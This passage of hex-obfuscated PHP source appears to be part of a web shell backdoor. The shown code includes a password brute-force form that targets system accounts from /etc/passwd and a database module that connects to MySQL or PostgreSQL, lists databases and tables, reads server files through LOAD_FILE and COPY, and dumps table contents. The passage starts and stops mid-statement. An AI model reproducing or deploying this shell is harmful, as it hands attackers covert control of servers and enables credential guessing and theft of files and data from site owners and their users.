61\x64\x69o \x6eam\x65=ty\x70e \x76\x61\x6cue=\x22\x31\x22\x20c\x68\x65\x63\x6b\x65\x64>\x20/\x65\x74\x63/pass\x77\x64\x3c/\x74\x64\x3e</t\x72>"."\x3c\x74\x72><t\x64>\x3c/td\x3e<t\x64\x20sty\x6c\x65=\x22\x70\x61dd\x69\x6e\x67-left:\x31\x35p\x78\x22\x3e\x3ci\x6e\x70\x75t\x20t\x79pe\x3dc\x68\x65c\x6b\x62ox \x6e\x61\x6d\x65=rever\x73\x65\x20\x76\x61\x6c\x75e\x3d1 c\x68\x65c\x6b\x65d>\x20\x72eve\x72se\x20(\x6cog\x69n -\x3e \x6eigo\x6c)\x3c/t\x64></\x74r\x3e"."<\x74\x72>\x3ctd\x3e</\x74d>\x3ctd\x3e<\x69\x6e\x70u\x74\x20typ\x65\x3dr\x61d\x69o\x20\x6e\x61\x6de=t\x79pe va\x6cue=\"2\x22\x3e D\x69\x63t\x69\x6fnar\x79\x3c/\x74d></t\x72\x3e"."\x3ct\x72>\x3c\x74\x64></\x74\x64\x3e\x3ct\x64\x3e\x3c\x74\x61\x62\x6c\x65 s\x74\x79\x6ce\x3d\"padd\x69ng-\x6cef\x74:1\x35p\x78\"\x3e\x3c\x74\x72>\x3c\x74d\x3e\x3c\x73p\x61\x6e>Logi\x6e</s\x70an>\x3c/\x74d\x3e"."\x3c\x74d\x3e<i\x6e\x70\x75\x74\x20\x74y\x70\x65=\x74ext \x6e\x61\x6de\x3d\x6cog\x69n\x20\x76\x61\x6cue=\"\x72oo\x74\x22>\x3c/\x74d\x3e\x3c/t\x72>"."<\x74\x72>\x3ctd><\x73p\x61n\x3eDi\x63\x74\x69\x6f\x6e\x61r\x79</s\x70\x61\x6e\x3e</\x74\x64\x3e"."<\x74\x64><i\x6ep\x75\x74\x20t\x79p\x65=\x74ext\x20\x6e\x61\x6de=\x64ic\x74\x20\x76\x61\x6cu\x65\x3d\x22".htmlspecialchars($GLOBALS["\x63w\x64"])."pa\x73swd.\x64\x69\x63\">\x3c/\x74d>\x3c/tr\x3e</ta\x62\x6ce\x3e"."\x3c/td\x3e\x3c/\x74\x72\x3e\x3ctr>\x3c\x74\x64\x3e</\x74\x64\x3e<\x74d\x3e\x3c\x69nput\x20\x74ype\x3dsub\x6di\x74\x20\x76a\x6c\x75\x65\x3d\x22\x73ubm\x69t\x22></td\x3e</\x74\x72\x3e\x3c/f\x6fr\x6d>\x3c/t\x61bl\x65\x3e";echo"</\x64\x69\x76\x3e";hardFooter();}function actionSql(){${"GL\x4fB\x41\x4c\x53"}["ofp\x68\x6d\x6f"]="\x64b";class DbClass{var$type;var$link;var$res;function DbClass($type){$this->type=${${"\x47\x4cO\x42AL\x53"}["\x79vb\x6c\x70\x6c\x6a\x78spw"]};}function connect($host,$user,$pass,$dbname){${"G\x4c\x4f\x42\x41L\x53"}["\x61\x6f\x7a\x64t\x65\x76\x7a\x6f"]="\x75\x73\x65r";switch($this->type){case"m\x79s\x71l":if($this->link=@mysql_connect($host,${${"GL\x4f\x42\x41\x4c\x53"}["\x61\x6f\x7a\x64\x74\x65vz\x6f"]},${${"\x47LO\x42A\x4c\x53"}["pj\x71ydqqg"]},true))return true;break;case"pg\x73ql":$host=explode(":",$host);if(!$host[1])$host[1]=5432;if($this->link=@pg_connect("\x68o\x73\x74\x3d{$host[0]} \x70ort={$host[1]}\x20\x75s\x65r=$user\x20\x70a\x73swo\x72d=$pass\x20dbn\x61me=$dbname"))return true;break;}return false;}function selectdb($db){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x6a\x6c\x63\x74jtd\x75\x77"]="d\x62";switch($this->type){case"\x6dysq\x6c":if(@mysql_select_db(${${"\x47L\x4fB\x41\x4c\x53"}["\x78jl\x63tjt\x64\x75w"]}))return true;break;}return false;}function query($str){${"\x47\x4c\x4fB\x41L\x53"}["pd\x72\x6fd\x69tp"]="\x73\x74\x72";switch($this->type){case"\x6dy\x73ql":return$this->res=@mysql_query(${${"\x47\x4c\x4f\x42\x41L\x53"}["\x70\x64\x72\x6f\x64\x69\x74\x70"]});break;case"p\x67\x73\x71l":return$this->res=@pg_query($this->link,${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x79\x6a\x67oq\x64\x70"]});break;}return false;}function fetch(){${${"\x47LO\x42A\x4c\x53"}["\x77j\x6c\x79d\x6a\x69\x70\x73f\x76\x6f"]}=func_num_args()?func_get_arg(0):$this->res;switch($this->type){case"m\x79\x73\x71l":return@mysql_fetch_assoc(${${"GL\x4f\x42AL\x53"}["\x77j\x6c\x79\x64ji\x70\x73f\x76\x6f"]});break;case"\x70\x67sql":return@pg_fetch_assoc(${${"\x47\x4cO\x42\x41L\x53"}["w\x6alyd\x6ai\x70\x73f\x76\x6f"]});break;}return false;}function listDbs(){switch($this->type){case"\x6d\x79s\x71l":return$this->query("\x53\x48OW\x20\x64\x61t\x61bas\x65\x73");break;case"p\x67\x73ql":return$this->res=$this->query("SELEC\x54 dat\x6e\x61me FROM \x70\x67_\x64at\x61b\x61\x73\x65\x20\x57\x48E\x52\x45\x20\x64atiste\x6dpla\x74\x65!\x3d\x27t\x27");break;}return false;}function listTables(){switch($this->type){case"\x6d\x79s\x71\x6c":return$this->res=$this->query("S\x48\x4fW \x54A\x42L\x45\x53");break;case"p\x67\x73\x71\x6c":return$this->res=$this->query("s\x65le\x63\x74 \x74ab\x6ce_\x6eame\x20\x66\x72\x6f\x6d i\x6e\x66ormat\x69\x6f\x6e_sc\x68e\x6d\x61.\x74\x61\x62\x6c\x65\x73 \x77here\x20\x74able_\x73ch\x65\x6da != \x27i\x6e\x66or\x6dat\x69\x6f\x6e\x5fsc\x68e\x6da\x27\x20A\x4e\x44 t\x61b\x6ce_\x73\x63hem\x61\x20\x21\x3d '\x70\x67\x5f\x63\x61\x74alo\x67\x27");break;}return false;}function error(){switch($this->type){case"\x6d\x79sq\x6c":return@mysql_error();break;case"\x70gs\x71\x6c":return@pg_last_error();break;}return false;}function setCharset($str){$pztdfdm="st\x72";switch($this->type){case"\x6dy\x73\x71\x6c":if(function_exists("m\x79sql_\x73et_c\x68\x61rs\x65\x74"))return@mysql_set_charset(${${"\x47L\x4f\x42AL\x53"}["y\x6a\x67\x6f\x71\x64\x70"]},$this->link);else$this->query("S\x45T\x20C\x48\x41R\x53\x45\x54\x20".${${"\x47LOB\x41\x4c\x53"}["yj\x67\x6fqd\x70"]});break;case"pg\x73\x71l":return@pg_set_client_encoding($this->link,${$pztdfdm});break;}return false;}function loadFile($str){${"\x47LO\x42A\x4c\x53"}["w\x61\x61\x62btnz\x6dy\x7a"]="r";${"GL\x4f\x42\x41L\x53"}["\x75\x71\x73\x65\x63\x67\x74\x74"]="\x72";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["r\x6aq\x6a\x6e\x62x\x68"]="\x73\x74\x72";$nxjgfwfr="\x69";switch($this->type){case"mys\x71\x6c":return$this->fetch($this->query("\x53ELEC\x54 \x4c\x4fAD\x5f\x46IL\x45(\x27".addslashes(${${"\x47\x4c\x4fB\x41\x4cS"}["\x79j\x67\x6f\x71\x64\x70"]})."\x27)\x20as\x20fil\x65"));break;case"pg\x73ql":$this->query("CREATE\x20T\x41BLE\x20\x68ar\x64\x32(\x66\x69\x6c\x65 t\x65xt);\x43\x4fPY\x20h\x61rd2 F\x52OM\x20'".addslashes(${${"G\x4c\x4fB\x41\x4cS"}["r\x6a\x71\x6a\x6eb\x78\x68"]})."\x27\x3b\x73el\x65c\x74 fil\x65\x20fr\x6fm\x20\x68\x61\x72d\x32\x3b");${${"G\x4c\x4f\x42ALS"}["u\x71\x73e\x63gtt"]}=array();while(${${"G\x4c\x4fB\x41\x4c\x53"}["\x66y\x6b\x6a\x78\x72\x74\x76k\x69"]}=$this->fetch())${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6d\x75\x64\x63\x74\x64\x66\x76is"]}[]=${$nxjgfwfr}["\x66il\x65"];$this->query("\x64\x72\x6fp\x20\x74\x61bl\x65 har\x64\x32");return array("\x66\x69l\x65"=>implode("\n",${${"\x47L\x4f\x42A\x4c\x53"}["waa\x62bt\x6e\x7amyz"]}));break;}return false;}function dump($table,$fp=false){$tucqcnutqh="\x74\x61bl\x65";${"\x47\x4cO\x42\x41LS"}["\x6bvw\x6c\x76\x68o"]="\x74ab\x6c\x65";$uigaufqafe="\x63r\x65ate";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x67\x6d\x65\x6e\x6b\x6ee\x72\x78"]="\x69";${"GL\x4fB\x41\x4cS"}["\x6b\x72\x79\x72\x77\x76\x62\x62k\x61"]="s\x71\x6c";$xuwlyxntj="f\x70";$wcdduqhmqon="\x73\x71\x6c";switch($this->type){case"\x6d\x79sq\x6c":${${"\x47\x4cOB\x41\x4cS"}["\x77\x6a\x6c\x79d\x6a\x69\x70\x73f\x76\x6f"]}=$this->query("SH\x4fW\x20CREATE\x20\x54A\x42\x4cE `".${${"\x47\x4cO\x42\x41\x4c\x53"}["k\x76\x77\x6cvh\x6f"]}."\x60");${${"G\x4cOB\x41L\x53"}["s\x6bm\x68\x6e\x6cqp"]}=mysql_fetch_array(${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x77\x6a\x6c\x79\x64\x6a\x69\x70\x73\x66\x76o"]});${$wcdduqhmqon}=${$uigaufqafe}[1].";\n";if(${${"\x47L\x4f\x42\x41\x4c\x53"}["r\x6d\x65\x73\x71\x63badw\x71"]})fwrite(${$xuwlyxntj},${${"G\x4c\x4f\x42A\x4c\x53"}["\x6b\x72yr\x77v\x62\x62\x6b\x61"]});else echo(${${"G\x4c\x4f\x42\x41\x4c\x53"}["qt\x64\x65\x6asw\x63\x6f\x77b\x74"]});$this->query("\x53E\x4c\x45\x43T\x20*\x20\x46R\x4fM `".${$tucqcnutqh}."`");${${"\x47\x4c\x4f\x42AL\x53"}["\x67\x6denk\x6e\x65\x72\x78"]}=0;${${"G\x4cO\x42A\x4c\x53"}["\x68\x6bo\x69my\x64\x79\x6f\x6dl"]}=true;while($▟=$this->fetch()){${"\x47\x4cO\x42\x41L\x53"}["\x70\x74\x7as\x74\x74\x67\x67\x73\x70"]="f\x70";$ojcvhghvkjc="\x76";$ttytcldwm="\x73\x71\x6c";$runqssjsff="k";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x62\x62r\x6c\x6bx\x69\x6bh\x73\x78"]="\x68e\x61\x64";${$ttytcldwm}="";if(${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x66yk\x6ax\x72\x74\x76k\x69"]}%1000==0){$vimmuvibdh="\x73\x71\x6c";$qgptuhmnrlr="\x68e\x61\x64";${$qgptuhmnrlr}=true;${$vimmuvibdh}="\x3b\n\n";}$stjuvqgucuf="\x63\x6f\x6c\x75\x6dn\x73";${$stjuvqgucuf}=array();foreach($▟as${$runqssjsff}=>${$ojcvhghvkjc}){$gtibysoufh="\x6b";$uxofqdhq="v";${"\x47L\x4f\x42\x41\x4cS"}["m\x6cqx\x68\x65u\x73\x71\x63w"]="\x6b";$mqllpuckws="\x63\x6f\x6c\x75\x6d\x6e\x73";${"GL\x4fBAL\x53"}["\x66q\x74c\x75\x63\x65\x69"]="\x76";${"GL\x4fBA\x4c\x53"}["\x66\x79\x74